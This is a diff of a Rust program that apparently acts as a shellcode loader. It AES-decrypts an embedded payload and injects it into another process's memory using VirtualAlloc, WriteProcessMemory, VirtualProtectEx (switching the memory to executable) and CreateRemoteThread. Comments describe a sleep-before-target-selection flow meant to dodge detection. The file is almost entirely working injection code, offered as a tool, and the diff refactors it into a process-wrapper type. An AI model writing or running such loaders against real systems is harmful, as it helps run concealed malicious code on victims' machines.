@@ -1,3 +1,5 @@
+use std::thread::current;
+
 use libaes::Cipher;
 
 // Importing shellcode variables from shellcode.rs
@@ -21,7 +23,6 @@ impl EncryptedShellcode<'_> {
     }
 }
 
-
 // The current execution flow idea is as follows:
 // This program starts, it sleeps for 30 seconds.
 // After sleeping, it'll look for a specified process 
@@ -39,41 +40,48 @@ fn main() {
     };
     let payload = encrypted_payload.decrypt();
     
-    let current_process_pid = enumerate_processes().unwrap();
+    let pids = enumerate_processes().unwrap();
+    let current_process_pid = pids.last().unwrap();
     //let args: Vec<String> = env::args().collect();
-    let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
-    //let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
-    // Let's allocate the required memory:
-    
-    let addr_space = nt_virtual_alloc(
-        *current_process_handle, 
+    let mut current_process = WindowsProcess::from_pid(*current_process_pid);
+    // Now, technically we shouldn't need to fetch a handle, as it'll do it automatically.
+    let address_start = match current_process.virtual_alloc(
         None, 
         Some(0x04),
         Some(payload.len()),
         None
-    ).unwrap();
+    ) {
+        Ok(address)  => { 
+            println!("[+] VirtualAlloc succeeded."); 
+            address
+        },
+        Err(e)          => panic!("[!] VirtualAlloc error!\n-> {:#x}", e.0),
+    };
+    match current_process.write_process_memory(
+        address_start as usize, 
+        payload.to_vec()
+    ){
+        Ok(_) => println!("[+] WriteProcessMemory succeeded."),
+        Err(e) => eprintln!("[!] WriteProcessMemory error!\n-> {:#x}", e.0),
+    }
 
-
-    // Let's write the buffer:
-    nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());
-
-    //virtual_protect_ex(*current_process_handle, addr_space, payload.len());
-    nt_virtual_protect_ex(*current_process_handle, addr_space, payload.len(), 0x10);
-
-    nt_create_remote_thread_ex(*current_process_handle, addr_space);
-    // Sleep to make sure the injection was succesful.
+    match current_process.virtual_protect(
+        address_start, 
+        payload.len(), 
+        0x10
+    ){
+        Ok(_) => println!("[+] VirtualProtectEx succeeded."),
+        Err(e) => eprintln!("[!] VirtualProtectEx error!\n-> {:#x}", e.0),
+    }
+    match current_process.create_remote_thread_ex(
+        address_start
+    ){
+        Ok(_) => println!("[+] CreateRemoteThread succeeded."),
+        Err(e) => eprintln!("[!] CreateRemoteThread error!\n-> {:#x}", e.0),
+    }
+    // This is used to test that the thread does spawn, as the process terminates too quickly otherwise.
     use std::{thread, time};
     let ten_millis = time::Duration::from_millis(100);
     thread::sleep(ten_millis);
-    /*
-    let variable_to_read = 100u8;
-    let variable_location = &variable_to_read as *const _ as *const c_void;
-    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
-    nt_write_process_memory(*current_process_handle, variable_location as usize, vec![64u8]);
-    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
 
-    
-    let addr_space = nt_virtual_alloc(*current_process_handle, None, None).unwrap();
-    nt_virtual_alloc(*current_process_handle, Some(addr_space as usize), Some(0x20)); 
-     */    
 }
